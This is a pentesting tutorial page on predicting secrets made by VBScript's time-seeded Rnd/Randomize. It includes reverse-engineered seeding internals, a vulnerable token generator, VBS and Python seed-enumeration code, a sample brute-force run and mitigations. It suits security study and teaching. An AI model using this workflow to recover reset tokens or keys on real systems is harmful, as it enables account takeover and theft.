# PRNG Weaknesses & Token Prediction

{{#include ../banners/hacktricks-training.md}}

When applications use non-cryptographic pseudo-random number generators (PRNGs) to create secrets (reset tokens, invite codes, OTPs, API keys), outputs are often predictable. Typical weaknesses include low-entropy or time-based seeding, truncated or biased state, and poor diffusion. Attackers exploit these by reconstructing seeds (often time-derived) and reproducing the PRNG stream to predict or brute-force secrets.

This page documents practical token-prediction techniques across weak PRNGs. Below is a deep-dive into VBScript’s global PRNG used by Rnd/Randomize, including precise seed reconstruction and an end-to-end brute-force workflow.


## VBScript Rnd/Randomize time-based prediction

Key idea: Many classic ASP/WSH/VBScript scripts use Randomize followed by Rnd() to generate secrets. The implicit time seeding path has very low resolution (~64 Hz) and narrows the seed to 32-bit float precision, collapsing entropy and making brute-force trivial within a narrow time window.

API surface:

```vb
' Seed from system clock when called with no arg
Randomize

' Seed with explicit Double
Randomize s

' Next float in [0,1)
r = Rnd()
```

High-level properties to exploit:
- No-arg Randomize uses GetLocalTime to derive a Timer()-style seconds value and then narrows that Double to a 32-bit Single (SSE CVTPD2PS). Windows default clock tick is ~15.625 ms (64 Hz), so the implicit seed only changes every 0.015625 s.
- Narrowing Double to Single causes many distinct times to map to the same 32-bit float. Effective seedings repeat daily and are highly non-uniform, creating frequent duplicates.
- Explicit Randomize s takes a Double but internally uses the Double’s high dword as the seed source. This differs from the no-arg path, which uses the 32-bit Single bit pattern produced by narrowing.
- State mixing only updates the middle two bytes, preserving top and bottom bytes, limiting diffusion between successive seeds.

### Reverse-engineered seed paths (summary)

No-arg Randomize (simplified):

```asm
; argc == 0 → use GetLocalTime
... call GetLocalTime
; compute seconds from hh:mm:ss + fractional ms
... cvtdq2pd / addsd ...
; Double → Single narrowing
cvtpd2ps  xmm0, xmm1
movss     [rsp+20h], xmm0   ; store float
mov       ecx, [rsp+20h]    ; seed bits (32-bit)
```

Explicit Randomize <seed> (critical difference):

```asm
; argc == 1 → take provided Double
movsd  xmm0, [rax+8]        ; load Double payload
mov    rcx, [rsp+20h]       ; raw IEEE-754 bits
shr    rcx, 20h             ; use high dword as seed source
```

Therefore, the same numeric value yields different internal seeds depending on the path:
- Implicit time seeding: time Double → Single via CVTPD2PS → 32-bit float bits are the seed.
- Explicit seeding: Double → take high dword of the 64-bit Double.

Example (time = 65860.48 seconds):
- As Double: 0x40f014479db22d0e
- No-arg path after narrowing → seed bits: 0x4780a23d
- Explicit Randomize seed path → seed bits: 0x40f01447

Mixer with limited diffusion (preserves top/bottom bytes):

```asm
and  dword [rbx+50h], 0FF0000FFh
mov  eax, ecx
shr  eax, 8
shl  ecx, 8
xor  eax, ecx
and  eax, 00FFFF00h
or   dword [rbx+50h], eax
```

Why this matters: If the target reseeds with Randomize (no arg), passing Timer() into Randomize s will not reproduce the same seed. To emulate the no-arg behavior, you must construct a Double whose high dword equals the 32-bit Single bit-pattern of the time value (snapped to 1/64 s), with the low dword set to zero.

### Vulnerable usage pattern

Reseeding inside a loop with time-based Randomize is extremely weak. Example:

```vb
Dim chars, n
chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789()*&^%$#@!"
n = 32

function GenerateToken(chars, n)
    Dim result, pos, i, charsLength
    charsLength = Int(Len(chars))
    For i = 1 To n
        Randomize     ' implicit, time-based seeding at 64 Hz
        pos = Int((Rnd * charsLength) + 1)
        result = result & Mid(chars, pos, 1)
    Next
    GenerateToken = result
end function
```

Notes:
- Calling Randomize repeatedly doesn’t change the PRNG state unless the seed actually changes (e.g., across ticks). Within the same 0.015625 s, outputs will repeat.
- To deterministically reinitialize the PRNG with a given seed, VBScript requires calling Rnd(-1) before Randomize s, per documentation.

### Reproducing implicit seeds with an explicit Double

Attack steps:
1) Convert a suspected generation time into the exact VBScript float32 Timer() value by snapping to 1/64 s and truncating to Single precision.
2) Build a Double whose high dword equals that float32 bit-pattern and low dword equals zero. Pass this Double to Randomize s to emulate no-arg seeding for that tick.
3) Iterate candidates across the time window in 0.015625 s steps and compare predicted tokens.

VBS helper (manual seed, reseeded per character to mirror vulnerable code):

```vb
Option Explicit
If WScript.Arguments.Count < 1 Then
    WScript.Echo "VBS_Error: Requires 1 seed argument."
    WScript.Quit(1)
End If
Dim seedToTest: seedToTest = WScript.Arguments(0)
WScript.Echo "Seed: " & seedToTest
Dim chars, n: chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789()*&^%$#@!": n = 32
WScript.Echo "Predicted token: " & GenerateToken(chars, n, seedToTest)
function GenerateToken(chars, n, seed)
    Dim result, pos, i, charsLength: charsLength = Int(Len(chars))
    For i = 1 To n
        Randomize seed            ' emulate implicit seed via crafted Double
        pos = Int((Rnd * charsLength) + 1)
        result = result & Mid(chars, pos, 1)
    Next
    GenerateToken = result
end function
```

Python core for seed enumeration:

```python
import struct

TICK = 1/64  # 0.015625 s

def vbs_timer_value(clock_secs: float) -> float:
    # snap to 1/64 s and force to Single (float32)
    secs = round(clock_secs / TICK) * TICK
    secs = struct.unpack('<f', struct.pack('<f', secs))[0]
    return secs

def make_manual_seed(timer_value: float) -> float:
    # build Double whose high dword == float32 bits, low dword == 0
    single_le = struct.pack('<f', timer_value)
    dbl_le    = b"\x00\x00\x00\x00" + single_le
    return struct.unpack('<d', dbl_le)[0]

# Example usage (invoke VBS):
# subprocess.run(["cscript.exe", "//nologo", VBS_PATH, str(seed)])
```

Capturing precise time inside VBS if you can instrument the server/client:

```vb
Dim t, hh, mm, ss, ns
t = Timer()
hh = Int(t \ 3600)
mm = Int((t Mod 3600) \ 60)
ss = Int(t Mod 60)
ns = (t - Int(t)) * 1000000
WScript.Echo Right("0" & hh, 2) & ":" & Right("0" & mm, 2) & ":" & Right("0" & ss, 2) & _
            "." & Right("000000" & CStr(Int(ns)), 6)
```

Example attack workflow:
- Obtain an approximate generation time (logs, file metadata, UI event timestamp).
- Enumerate candidate seeds at 64 Hz within the window; de-duplicate predicted tokens (collisions are common).
- Match the predicted token to recover the real secret.

Sample run:

```
[INFO] Range 64554.00000 to 64555.00000 in 0.015625-s steps
[64554.00000] Test #1: eYIkXKdsUTC3Uz#R)P$BlVRJie9U2(4B
[64554.01562] Test #2: ZTDgSGZnPP#yQv*M6L)#hQNEdZ5Px50$
[64554.03125] Test #3: VP!bOBUjLK&uLq8I2G7*cMIAZV0Lt1v*
[64554.04688] Test #4: QK^XJ#QeGG8pHm3DxC28YHE%VQwGowr7
```

Impact:
- Within one second, there are only 64 effective seeds. Given a narrow window (± a few seconds), brute-force is trivial. Seeds repeat daily and bias causes frequent collisions, enabling fast recovery.

Mitigations:
- Do not use VBScript PRNG for secrets. Use a CSPRNG such as Windows BCryptGenRandom/RtlGenRandom or .NET RandomNumberGenerator.
- If VBScript must remain, generate secrets in a secure component and inject them; never derive from Timer().
- Avoid loop reseeding; if you must reinitialize deterministically, call Rnd(-1) before Randomize s.

### Tips and edge cases
- Time zone or DST does not matter for prediction if you derive seeds from Timer()-like seconds-of-day; just ensure your parsed wall clock maps to seconds since midnight and is snapped to 1/64 s.
- When emulating implicit seeding, ensure you cast to Single (float32) before constructing the Double so Randomize s sees the correct high dword.
- If output alphabet/length is known, precompute token outputs per candidate seed and cache to speed up matching.

## See also
- Debian predictable OpenSSL PRNG (weak SSH keys). Check the note in: [Brute Force - CheatSheet](brute-force.md)
- Time-based UUID v1 prediction: Check [UUID Insecurities](../pentesting-web/uuid-insecurities.md)

## References
- [Yet Another Random Story: VBScript's Randomize Internals](https://blog.doyensec.com/2025/09/25/yet-another-random-story.html)
- [VBScript Rnd/Randomize](https://www.vbsedit.com/html/94c21ac3-37a7-4f77-8ec5-09b3ec4f3c1f.asp)
- [VBScript Timer](https://www.vbsedit.com/html/2b8d4a73-9f92-4d0f-87c4-0d7c7cf9c5d5.asp)
- [x86 CVTPD2PS instruction](https://www.felixcloutier.com/x86/cvtpd2ps)
- [VBScript deprecation in Windows (FoD)](https://techcommunity.microsoft.com/t5/windows-it-pro-blog/prioritizing-security-and-modernization-with-vbscript-deprecation/ba-p/4155514)

{{#include ../banners/hacktricks-training.md}}
